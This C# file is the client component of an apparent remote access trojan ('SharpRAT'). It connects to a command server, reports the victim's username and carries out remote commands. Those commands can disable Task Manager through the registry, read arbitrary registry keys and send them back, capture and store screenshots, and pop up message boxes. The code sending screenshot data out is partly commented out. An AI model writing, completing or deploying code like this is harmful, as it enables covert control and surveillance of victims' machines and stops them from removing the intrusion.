using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using Microsoft.Win32;

namespace Client.Client
{
    internal class SocketClient
    {
        bool 
            bShouldRun = true,
            bNameSent = false;
        private Socket serverSocket;

        public Socket GetServerSocket()
        {
            return serverSocket;
        }

        private bool SendName()
        {
            GetServerSocket().Send(Encoding.ASCII.GetBytes("<CMD=NAME>" + WindowsHelper.GetUsername() + "<EOF>"));
            return true;
        }

        private void ParseData(string data)
        {
            string tempString = data.Replace("<EOF>", "");

            if (tempString.StartsWith("<CMD=MSGBOX>"))
            {
                tempString = tempString.Replace("<CMD=MSGBOX>", "");
                Main.uiRequests.Request(tempString, RequestUI.RequestType.UI_SHOW_MESSAGEBOX);
            }
            else if(tempString.StartsWith("<PING>"))
            {
                GetServerSocket().Send(Encoding.ASCII.GetBytes(tempString));
            }
            else if(tempString.StartsWith("<SET-TASKMGR>"))
            {
                string value = tempString.Split(">")[1];
                const string keyPath = @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
                WindowsHelper.WriteRegistryKey(keyPath, RegistryValueKind.DWord, "DisableTaskMgr", value, true);
            }
            else if(tempString.StartsWith("<GET-REGKEY>"))
            {
                tempString = tempString.Replace("<GET-REGKEY>", "");
                string[] split = tempString.Split("<SPLIT>");
                string returnString = WindowsHelper.ReadRegistryKey(split[0], split[1]);
                GetServerSocket().Send(Encoding.ASCII.GetBytes("<GET-REGKEY>" + returnString));
            }
            else if(tempString.StartsWith("<SHUTDOWN-CLIENT>"))
            {
                bShouldRun = false;
                GetServerSocket().Disconnect(false);
                GetServerSocket().Close();
                Application.Exit();
            }
            else if (tempString.StartsWith("<SCREENSHOT>"))
            {
                Debug.WriteLine("received screenshot command");

                Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics g = Graphics.FromImage(bitmap);
                g.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                Graphics memoryGraphics = Graphics.FromImage(bitmap);

                memoryGraphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);

                //That's it! Save the image in the directory and this will work like charm.  
                string fileName = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\SharpRAT\screenshot\Screenshot" + "_" + DateTime.Now.ToString("(dd_MMMM_hh_mm_ss_tt)") + ".png");

                // save it  
                bitmap.Save(fileName);
                MemoryStream ms = new MemoryStream();
                bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Bmp);
                byte[] b = ms.ToArray();
                Debug.WriteLine($"{b}");
                GetServerSocket().Send(Encoding.ASCII.GetBytes("<SCREENSHOT>"/*+ b*/+"<EOF>"));
                //GetServerSocket().Send(Encoding.ASCII.GetBytes($"{ b}"));
                //GetServerSocket().Send(Encoding.ASCII.GetBytes("<EOF>"));
                ms.Close();
                Debug.WriteLine("sent data back");
            }
        }
        public void ExecuteClient()
        {
            while (bShouldRun)
            {
                try
                {
                    // Connect to server, currently localhost and port 11111.
                    IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
                    IPAddress ipAddress = ipHost.AddressList[0];
                    IPEndPoint localEndPoint = new IPEndPoint(ipAddress, 11111);

                    // TCP/IP Socket.
                    serverSocket = new(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

                    // Connect to server.
                    GetServerSocket().Connect(localEndPoint);

                    if (!bNameSent)
                        bNameSent = SendName();
                    try
                    {
                        while (serverSocket.Connected)
                        {
                            // Data buffer
                            byte[] messageReceived = new byte[1024];
                            int byteRecv = serverSocket.Receive(messageReceived);
                            ParseData(Encoding.ASCII.GetString(messageReceived, 0, byteRecv));
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }

                    if (!serverSocket.Connected)
                        bNameSent = false;
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
        }
    }
}
